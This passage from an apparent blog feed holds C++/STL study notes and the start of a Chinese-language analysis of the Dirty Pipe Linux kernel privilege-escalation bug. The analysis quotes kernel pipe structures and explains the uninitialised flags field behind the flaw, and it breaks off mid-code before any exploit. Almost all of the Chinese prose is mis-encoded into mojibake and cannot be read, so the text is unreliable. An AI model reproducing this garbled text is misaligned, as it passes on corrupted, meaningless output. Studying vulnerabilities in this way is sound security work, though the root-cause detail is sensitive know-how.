href="https://en.cppreference.com/w/cpp/20">Cpp20</a>.</p><h3 id="11"><a href="#11" class="headerlink" title="11"></a>11</h3><p>é™¤äº†è¯­è¨€ç‰¹æ€§è¿˜çœ‹åˆ°äº†ä¸€äº›æœ‰è¶£çš„ä¸œè¥¿. æ¯”å¦‚ ratio library, Concurrency support libraryç­‰ç­‰</p><ul><li>user-defined literal</li><li>attributes</li><li>noexcept : <ul><li>If a function modified with <code>noexcept</code> is thrown, the compiler will use <code>std::terminate()</code> to immediately terminate the program. </li><li> can also be used as an operator to manipulate an expression</li><li><code>noexcept</code> ä¿®é¥°å®Œä¸€ä¸ªå‡½æ•°ä¹‹åèƒ½å¤Ÿèµ·åˆ°å°é”å¼‚å¸¸æ‰©æ•£çš„åŠŸæ•ˆï¼Œå¦‚æœå†…éƒ¨äº§ç”Ÿå¼‚å¸¸ï¼Œå¤–éƒ¨ä¹Ÿä¸ä¼šè§¦å‘</li></ul></li><li></li></ul><hr><h1 id="SGI-STL-Src"><a href="#SGI-STL-Src" class="headerlink" title="SGI STL Src"></a>SGI STL Src</h1><p>ä¹¦ä¸­æºç : <a href="https://github.com/yogdzewa/STLSourceCodeNote">https://github.com/yogdzewa/STLSourceCodeNote</a> (æ›´å…¨) </p><p>æ ‡é¢˜ä¸ºåˆ«äººçš„ç¬”è®°, æ„Ÿè§‰æ²¡å¿…è¦å†åšä¸€ä¸ª. </p><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>å…­å¤§ç»„ä»¶</p><ul><li>containers</li><li>algorithms</li><li>iterators</li><li>functors(ä»¿å‡½æ•°)</li><li>adapters(é…æ¥å™¨)</li><li>allocators(é…ç½®å™¨)</li></ul><img src="../../image/CXX_Correlative/image-20230121184607672.png" alt="image-20230121184607672" style="zoom:80%;" /><h2 id="allocator"><a href="#allocator" class="headerlink" title="allocator"></a><a href="https://github.com/steveLauwh/SGI-STL/tree/master/The%20Annotated%20STL%20Sources%20V3.3/allocator">allocator</a></h2><ul><li>ä¸ºäº†ç²¾å¯†åˆ†å·¥ï¼Œ STL allocator å†³å®šå°†è¿™ä¸¤é˜¶æ®µæ“ä½œåŒºåˆ†å¼€æ¥ã€‚ å†…å­˜é…ç½®æ“ä½œç”± alloc:allocate () è´Ÿè´£ï¼Œ å†…å­˜é‡Šæ”¾æ“ä½œç”± alloc: :deallocate() è´Ÿè´£ï¼›å¯¹è±¡æ„é€ æ“ä½œç”± : : construct() è´Ÿè´£ï¼Œå¯¹è±¡ææ„æ“ä½œç”± : : destroy() è´Ÿè´£ã€‚</li><li><img src="../../image/CXX_Correlative/image-20230121190308943.png" alt="image-20230121190308943" style="zoom:80%;" /></li><li> SGI æ­£æ˜¯ä»¥ malloc(ï¼‰å’Œ free() å®Œæˆå†…å­˜çš„é…ç½®ä¸é‡Šæ”¾ã€‚</li><li><img src="../../image/CXX_Correlative/image-20230121233157488.png" alt="image-20230121233157488" style="zoom:80%;" /></li></ul><img src="../../image/CXX_Correlative/image-20230121233222146.png" alt="image-20230121233222146" style="zoom:80%;" /><ul><li>æ„Ÿè§‰æ²¡å•¥ç‰¹åˆ«çš„, gccæºç ä¸€çœ‹æ˜¯ç”¨çš„<code>std::allocator</code>, å’Œè¿™é‡Œå¥½åƒä¸å¤ªä¸€æ ·, æš‚æ—¶è·³è¿‡</li></ul><h2 id="iterator"><a href="#iterator" class="headerlink" title="iterator"></a><a href="https://github.com/steveLauwh/SGI-STL/tree/master/The%20Annotated%20STL%20Sources%20V3.3/iterator">iterator</a></h2><ul><li><img src="../../image/CXX_Correlative/image-20230123113720206.png" alt="image-20230123113720206"></li></ul><h2 id="associative-container"><a href="#associative-container" class="headerlink" title="associative container"></a><strong><a href="https://github.com/steveLauwh/SGI-STL/tree/master/The%20Annotated%20STL%20Sources%20V3.3/container/associative%20container">associative container</a></strong></h2><p>ä¹¦ä¸­å…ˆè®²äº†çº¢é»‘æ ‘, ç„¶åæ˜¯å„ç§å…³è”å¼å®¹å™¨çš„ä»‹ç». </p>]]></content>
    
    
    <categories>
      
      <category>programming_language</category>
      
      <category>src code</category>
      
    </categories>
    
    
    <tags>
      
      <tag>programming_language - æºç åˆ†æ - C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dirtypipeæ¼æ´åˆ†æ</title>
    <link href="/2022-11/CVE-dirtypipe/"/>
    <url>/2022-11/CVE-dirtypipe/</url>
    
    <content type="html"><![CDATA[<p>åŸºæœ¬å‚è€ƒ â€“&gt; <a href="https://kiprey.github.io/2022/04/dirty-pipe">kp</a> &lt;â€“</p><h3 id="ä¸€ã€ç®€ä»‹"><a href="#ä¸€ã€ç®€ä»‹" class="headerlink" title="ä¸€ã€ç®€ä»‹"></a>ä¸€ã€ç®€ä»‹</h3><p>Dirty Pipe æ¼æ´æ˜¯ Linux ç³»ç»Ÿä¸­çš„ä¸€ä¸ªå†…æ ¸ææƒæ¼æ´ï¼Œæ¼æ´å±å®³å ªæ¯” Dirty COWï¼Œä½†ç›¸å¯¹äº Dirty COW æ¥è¯´æ›´åŠ å®¹æ˜“åˆ©ç”¨ã€‚</p><p>æ¼æ´å½±å“èŒƒå›´ï¼š<a href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958">pipe: merge anon_pipe_buf*_ops - linux commit</a> ï¼ˆv5.8-rc1ï¼‰ ~ <a href="https://github.com/torvalds/linux/commit/9d2231c5d74e13b2a0546fee6737ee4446017903">lib/iov_iter: initialize â€œflagsâ€ in new pipe_buffer</a>ï¼ˆv5.17-rc6ï¼‰</p><p>æ—¶é—´èŒƒå›´å¤§æ¦‚æ˜¯ 2020/5/21 - 2022/2/21ã€‚</p><h3 id="äºŒã€ç¯å¢ƒæ­å»º"><a href="#äºŒã€ç¯å¢ƒæ­å»º" class="headerlink" title="äºŒã€ç¯å¢ƒæ­å»º"></a>äºŒã€ç¯å¢ƒæ­å»º</h3><p>åœ¨githubä¸Šç›´æ¥ä¸‹è½½f6dd97ç‰ˆæœ¬, å€Ÿç”¨äº†pwn.collegeçš„<a href="https://github.com/pwncollege/pwnkernel">è„šæœ¬</a>. ç„¶åå†…æ ¸ç¼–è¯‘è®¾ç½®å€Ÿé‰´kpçš„<a href="https://kiprey.github.io/2022/04/dirty-pipe/#%E4%BA%8C%E3%80%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">blog</a>. </p><p>ç¼–è¯‘é‡åˆ°çš„é¢å¤–é—®é¢˜:</p><ul><li><p>ç»å…¸çš„<a href="https://www.spinics.net/lists/kernel/msg3797871.html">thunk.o</a>, å·²ç»é‡åˆ°è¿‡äº†. </p></li><li><p>ç„¶ååˆæ¥ä¸ªæ–°æ´», æ‰“äº†åˆä¸€ä¸ª<a href="https://lore.kernel.org/all/9a9cae7fcf628843aabe5a086b1a3c5bf50f42e8.1585761021.git.jpoimboe@redhat.com/">patch</a>. çœŸæ‰¾äº†åŠå¤©.  </p><img src="../../image/dirtypipe/image-20221109224329290.png" alt="image-20221109224329290" style="zoom:80%;" /></li><li><p>ç„¶ååˆè£…äº†ä¸ª<a href="https://src.fedoraproject.org/rpms/dwarves#:~:text=dwarves%20is%20a%20set%20of,recent%20ones%20such%20as%20systemtap.">dwarves</a>, å› ä¸º<code>BTF: .tmp_vmlinux.btf: pahole (pahole) is not available</code> </p></li></ul><h3 id="ä¸‰-ä»£ç æµ…æ"><a href="#ä¸‰-ä»£ç æµ…æ" class="headerlink" title="ä¸‰. ä»£ç æµ…æ"></a>ä¸‰. ä»£ç æµ…æ</h3><blockquote><p>pipeç›¸å…³å‡½æ•°<a href="https://www.kernel.org/doc/html/latest/filesystems/splice.html#c.pipe_buffer">æ¥å£</a>(æ— æºç , kernel doc) </p></blockquote><h4 id="read-amp-write"><a href="#read-amp-write" class="headerlink" title="read&amp;write"></a>read&amp;write</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">pipefifo_fops</span> =</span> &#123;<br>    .open             = fifo_open,<br>    .llseek           = no_llseek,<br>    .read_iter        = pipe_read,     <span class="hljs-comment">// read</span><br>    .write_iter       = pipe_write,    <span class="hljs-comment">// write</span><br>    .poll             = pipe_poll,<br>    .unlocked_ioctl   = pipe_ioctl,<br>    .release          = pipe_release,<br>    .fasync           = pipe_fasync,<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>read&amp;writeå‡½æ•°å£°æ˜å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">ssize_t</span> <span class="hljs-title">pipe_read</span><span class="hljs-params">(struct kiocb *iocb, struct iov_iter *to)</span></span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">ssize_t</span> <span class="hljs-title">pipe_write</span><span class="hljs-params">(struct kiocb *iocb, struct iov_iter *from)</span></span><br></code></pre></div></td></tr></table></figure><p>åªéœ€ç®€å•çŸ¥é“ï¼š</p><ul><li><code>iocb</code>ï¼šä¸­å­˜æ”¾ç€è·å–å½“å‰ pipe ç»“æ„ä½“çš„æŒ‡é’ˆ</li><li><code>from/to</code>ï¼šä»ç®¡é“è¯»å‡ºæ¥çš„æ•°æ®å°†è¦å†™å…¥çš„åœ°æ–¹ï¼Œiov_iter è¿­ä»£å™¨ç±»å‹ã€‚</li></ul><h4 id="pipe-inode-info"><a href="#pipe-inode-info" class="headerlink" title="pipe_inode_info"></a>pipe_inode_info</h4><p><code>pipe_inode_info</code> ç»“æ„ä½“å­˜æ”¾äº† pipe æœºåˆ¶æ‰€è¦ç”¨åˆ°çš„å­—æ®µï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  struct pipe_inode_info - a linux kernel pipe</span><br><span class="hljs-comment"> *  @mutex: mutex protecting the whole thing</span><br><span class="hljs-comment"> *  @rd_wait: reader wait point in case of empty pipe</span><br><span class="hljs-comment"> *  @wr_wait: writer wait point in case of full pipe</span><br><span class="hljs-comment"> *  @head: The point of buffer production</span><br><span class="hljs-comment"> *  @tail: The point of buffer consumption</span><br><span class="hljs-comment"> *  @max_usage: The maximum number of slots that may be used in the ring</span><br><span class="hljs-comment"> *  @ring_size: total number of buffers (should be a power of 2)</span><br><span class="hljs-comment"> *  @tmp_page: cached released page</span><br><span class="hljs-comment"> *  @readers: number of current readers of this pipe</span><br><span class="hljs-comment"> *  @writers: number of current writers of this pipe</span><br><span class="hljs-comment"> *  @files: number of struct file referring this pipe (protected by -&gt;i_lock)</span><br><span class="hljs-comment"> *  @r_counter: reader counter</span><br><span class="hljs-comment"> *  @w_counter: writer counter</span><br><span class="hljs-comment"> *  @fasync_readers: reader side fasync</span><br><span class="hljs-comment"> *  @fasync_writers: writer side fasync</span><br><span class="hljs-comment"> *  @bufs: the circular array of pipe buffers</span><br><span class="hljs-comment"> *  @user: the user who created this pipe</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">mutex</span>;</span><br>    <span class="hljs-keyword">wait_queue_head_t</span> rd_wait, wr_wait;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> head;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> tail;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> max_usage;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> ring_size;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> readers;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> writers;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> files;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> r_counter;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> w_counter;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">tmp_page</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync_readers</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync_writers</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">bufs</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span>;</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>pipe å­˜æ”¾æ•°æ®ä½¿ç”¨çš„æ˜¯<strong>ç¯å½¢é˜Ÿåˆ—</strong>ï¼Œå³åœ¨å®šé•¿å¤§å°çš„æ•°æ®ç¯ï¼ˆpipe buf ringï¼‰ä¸Šï¼Œå°½å¯èƒ½çš„å­˜å‚¨æ•°æ®. </p><ul><li><code>head</code>ï¼šæ ‡æ³¨é˜Ÿåˆ—é¦–éƒ¨çš„<strong>ç´¢å¼•</strong>ï¼Œ<strong>head ä¸ºæ¥ä¸‹æ¥è¦å†™å…¥çš„ä½ç½®</strong>ã€‚</li><li><code>tail</code>ï¼šæ ‡æ³¨é˜Ÿåˆ—å°¾éƒ¨çš„ç´¢å¼•ï¼Œ<strong>tail ä¸ºæ¥ä¸‹æ¥è¦è¯»å–çš„ä½ç½®</strong>ã€‚</li></ul><h4 id="pipe-buffer"><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h4><p>è¯¥ç»“æ„ä½“å­˜æ”¾ç€å®é™…ç®¡é“ä¸­å­˜æ”¾çš„æ•°æ®ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  struct pipe_buffer - a linux kernel pipe buffer</span><br><span class="hljs-comment"> *  @page: the page containing the data for the pipe buffer</span><br><span class="hljs-comment"> *  @offset: offset of data inside the @page</span><br><span class="hljs-comment"> *  @len: length of data inside the @page</span><br><span class="hljs-comment"> *  @ops: operations associated with this buffer. See @pipe_buf_operations.</span><br><span class="hljs-comment"> *  @flags: pipe buffer flags. See above.</span><br><span class="hljs-comment"> *  @private: private data owned by the ops.</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> offset, len;<br>    <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> flags;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">private</span>;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>è¿™ä¸ªç»“æ„ä½“å­˜æ”¾äº†åŒ…æ‹¬é¡µå¼•ç”¨ã€é¡µåç§»ã€æ•°æ®å¤§å°ç­‰å…³é”®ä¿¡æ¯ã€‚è¿™é‡Œçš„ flag å…±æœ‰è¿™å‡ ç§ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// include/linux/pipe_fs_i.h</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_LRU       0x01    <span class="hljs-comment">/* page is on the LRU */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_ATOMIC    0x02    <span class="hljs-comment">/* was atomically mapped */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_GIFT      0x04    <span class="hljs-comment">/* page is a gift */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_PACKET    0x08    <span class="hljs-comment">/* read() as a packet */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_CAN_MERGE 0x10    <span class="hljs-comment">/* can merge buffers */</span></span><br></code></pre></div></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥æš‚æ—¶ä¸ç”¨å»ç®¡è¿™å‡ ç§ flag å…·ä½“çš„æ„æ€ã€‚</p><h4 id="iov-iter"><a href="#iov-iter" class="headerlink" title="iov_iter"></a>iov_iter</h4><p>ç»“æ„ä½“ iov_iter ç”¨äº<strong>è¿­ä»£</strong>é‚£ç§<strong>è¢«åˆ†ä¸ºå¤šä¸ªé¡µçš„æ•°æ®</strong>ï¼Œæ¢å¥è¯è¯´ï¼Œè¯¥ç»“æ„ä½“å°†ç”¨äºè¿­ä»£ä¸€ä¸ªä¸ªé¡µé¢ã€‚å…¶ç»“æ„ä½“å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">iter_type</span> &#123;</span><br>    <span class="hljs-comment">/* iter types */</span><br>    ITER_IOVEC = <span class="hljs-number">4</span>,<br>    ITER_KVEC = <span class="hljs-number">8</span>,<br>    ITER_BVEC = <span class="hljs-number">16</span>,<br>    ITER_PIPE = <span class="hljs-number">32</span>,    <span class="hljs-comment">// è¡¨ç¤ºæ­£åœ¨è¿­ä»£çš„æ•°æ®æ˜¯ä½äº pipe ä¸­çš„</span><br>    ITER_DISCARD = <span class="hljs-number">64</span>,<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iov_iter</span> &#123;</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Bit 0 is the read/write bit, set if we&#x27;re writing.</span><br><span class="hljs-comment">     * Bit 1 is the BVEC_FLAG_NO_REF bit, set if type is a bvec and</span><br><span class="hljs-comment">     * the caller isn&#x27;t expecting to drop a page reference when done.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> type;<br>    <span class="hljs-keyword">size_t</span> iov_offset;<br>    <span class="hljs-keyword">size_t</span> count;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> *<span class="hljs-title">iov</span>;</span><br>        <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvec</span> *<span class="hljs-title">kvec</span>;</span><br>        <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bio_vec</span> *<span class="hljs-title">bvec</span>;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span>;</span><br>    &#125;;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> nr_segs;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> head;<br>            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> start_head;<br>        &#125;;<br>    &#125;;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>å…¶ä¸­ï¼Œä¸€äº›å­—æ®µçš„æ„ä¹‰å¦‚ä¸‹ï¼š</p><ul><li><p><code>type</code>ï¼šè¡¨ç¤ºå½“å‰è¿­ä»£çš„æ•°æ®æ˜¯æ¥è‡ªäºä»€ä¹ˆç»“æ„ï¼Œä¾‹å¦‚ï¼š</p><ul><li>ITER_PIPE è¡¨ç¤ºå½“å‰è¿­ä»£çš„æ•°æ®ä¸ºæŸä¸ª pipe ä¸­çš„é¡µæ•°æ®</li><li>ITER_DISCARD è¡¨ç¤ºå†™å…¥å½“å‰ iov_iter çš„æ•°æ®å…¨éƒ¨ä¸¢å¼ƒã€‚</li><li><code>ITER_KVEC</code> do almost the same, but with data in <strong>kernel</strong> space, </li><li><code>ITER_BVEC</code> to work with parts of memory mapped pages.</li></ul><p>åç»­é’ˆå¯¹ iov_iter åšå†…å­˜è¯»å†™æ—¶ï¼Œä¼šæ ¹æ®è¿™ä¸ª type æ¥æ‰§è¡Œä¸åŒç±»å‹çš„å†…å­˜è¯»å†™æ“ä½œã€‚</p></li><li><p><code>iov_offset</code>ï¼šå½“å‰æ‰€è¿­ä»£åˆ° page çš„ç›¸å¯¹åç§»ï¼Œè¯»å†™å°†ä»è¯¥ page çš„è¿™ä¸ªç›¸å¯¹åç§»å¼€å§‹ã€‚</p></li><li><p><code>cout</code>ï¼šå¯è¯»å†™çš„æ•°ç»„å­—èŠ‚å¤§å°</p></li></ul><h4 id="pipe-readç›¸å…³è°ƒç”¨ç»“æ„"><a href="#pipe-readç›¸å…³è°ƒç”¨ç»“æ„" class="headerlink" title="pipe_readç›¸å…³è°ƒç”¨ç»“æ„"></a>pipe_readç›¸å…³è°ƒç”¨ç»“æ„</h4><pre><code class=" mermaid">flowchart TBs[&quot;pipe_read(pipe-&gt;iter)&quot;] --&gt; copy_page_to_itercopy_page_to_iter --&gt;|iter KVEC+BVEC| copy_to_itercopy_page_to_iter --&gt;|ITER_PIPE| copy_page_to_iter_pipecopy_page_to_iter --&gt;|other type| copy_page_to_iter_ioveccopy_to_iter --&gt; _copy_to_iter_copy_to_iter --&gt;|iter is pipe| copy_pipe_to_iter_copy_to_iter --&gt;|other| iterate_and_advance???other_callpoint --&gt;|with iov_iter is pipe| copy_to_itercopy_pipe_to_iter --&gt; push_pipecopy_pipe_to_iter --&gt; a[&quot;memcpy_to_page(per page)&quot;]</code></pre><ul><li><strong>å¤§è‡´æµç¨‹</strong>: å¾ªç¯éå†pipe-&gt;bufsæ•°ç»„, ä½¿ç”¨<code>copy_page_to_iter</code>å°†bufä¸­çš„ä¸€æ•´ä¸ªpageå¤åˆ¶åˆ°iterä¸­, å¦‚æœiteræ˜¯pipe, åˆ™ä¸å¤åˆ¶ç›´æ¥å¼•ç”¨, å¦‚æ­¤å¾ªç¯å†é¡¾åŠåˆ°æˆªæ–­ç­‰é—®é¢˜å°±ç»“æŸè¯»å–. </li><li><code>copy_pipe_to_iter</code>çœŸæ˜¯å¤Ÿæœ‰è¿·æƒ‘æ€§çš„, å®ƒæ˜¯æŒ‡iterçš„ç±»å‹æ˜¯pipe, è¦ä»addræŒ‡å‘çš„é¡µé¢ä¸­å¤åˆ¶å†…å®¹åˆ°pipe bufä¸­. </li><li>ç”±äº<code>copy_page_to_iter_pipe</code> pipe buf æ˜¯<strong>ç›´æ¥å¼•ç”¨å…¶ä»–é¡µ</strong>ï¼Œå› æ­¤åœ¨ page_write å¤„<strong>å¿…é¡»ç¡®ä¿æ–°ä¼ æ¥çš„æ•°æ®ä¸ä¼šå†™å…¥è¿™æ ·çš„é¡µé¢</strong>ä¸­ï¼Œè€Œè¿™ç§ä¿è¯å°±ä¾èµ–äº MERGE æ ‡å¿—ã€‚ç„¶è€Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ªæœ‰æ„æ€çš„äº‹æƒ…ï¼šè™½ç„¶ recv pipe buf ç»“æ„ä½“ä¸Šçš„ä¼—å¤šå­—æ®µéƒ½è¢«é‡æ–°èµ‹å€¼ï¼Œ<strong>ä½†æœ‰ä¸€ä¸ªå­—æ®µå´è¢«é—æ¼äº†</strong>ï¼Œ<strong>é‚£å°±æ˜¯ flags å­—æ®µ</strong>ï¼</li><li><code>push_pipe</code>çš„ä½œç”¨æ˜¯æ£€æŸ¥è¦å†™å…¥çš„pipeçš„ç©ºé—´æ˜¯å¦è¶³å¤Ÿ. å¦‚æœä¸å¤Ÿåˆ™è¿›è¡Œæ‰©å……. å½“ kernel å¾ªç¯æ‰©å…… pipe_buffer ä¸Šçš„é¡µæ—¶ï¼Œè¿™é‡Œä¹Ÿ<strong>å¹¶æ²¡æœ‰åˆå§‹åŒ– pipe_buffer çš„ flag æ ‡å¿—</strong>ï¼åˆå› ä¸º pipe_buffer åœ¨è®¾è®¡ä¸Šä¾¿æ˜¯ä¸€ä¸ªç¯ï¼Œå› æ­¤åœ¨æ‰©å­” pipe_buffer æ—¶ï¼Œè¿™é‡Œä¹Ÿ<strong>å°†é‡ç”¨å…ˆå‰ pipe_buffer æ‰€è®¾ç½®çš„ flag</strong>ã€‚</li><li>ä¸€ä¸ªå°é—®é¢˜, çœ‹åˆ°<code>void *kaddr = kmap_atomic(page);</code>å‡½æ•°, æŸ¥åˆ°äº†highmemè¿™ä¸ª<a href="https://dri.freedesktop.org/docs/drm/vm/highmem.html">æ¦‚å¿µ</a>. ä¸è¿‡å‡½æ•°å…·ä½“å®ç°æ˜¯å’Œæ¶æ„ç›¸å…³çš„.</li></ul><blockquote><p>è¿™é‡Œç®€å•æ€»ç»“ä¸€ä¸‹ copy_page_to_iter å‡½æ•°ä¸ copy_to_iter å‡½æ•°åœ¨<strong>å¤åˆ¶æ•°æ®è¿› pipe æ—¶</strong> æ‰€å®ç°çš„å·®å¼‚ï¼š</p><ul><li>å‰è€…æ˜¯åœ¨ä¸€ä¸ªå®Œæ•´ page ä¸Šï¼Œå°†æ•°æ®å¤åˆ¶ç»™ pipeã€‚å› æ­¤ pipe buf åªéœ€ç›´æ¥å¼•ç”¨è¯¥é¡µï¼Œå¹¶è®°å½•ä¸‹ offset å’Œ lenï¼Œå³å¯å®Œæˆå¤åˆ¶æ“ä½œã€‚</li><li>åè€…ä¸ä¿è¯æºæ•°æ®åœ¨å®Œæ•´ page ä¸Šï¼Œè€Œæ˜¯æä¾›äº† addr å’Œ lenï¼Œå› æ­¤ pipe buf éœ€è¦è‡ªå·±å‡†å¤‡å­˜æ”¾æ•°æ®çš„ pageã€‚</li></ul></blockquote><p>copy_page_to_iter_pipeä»£ç :</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 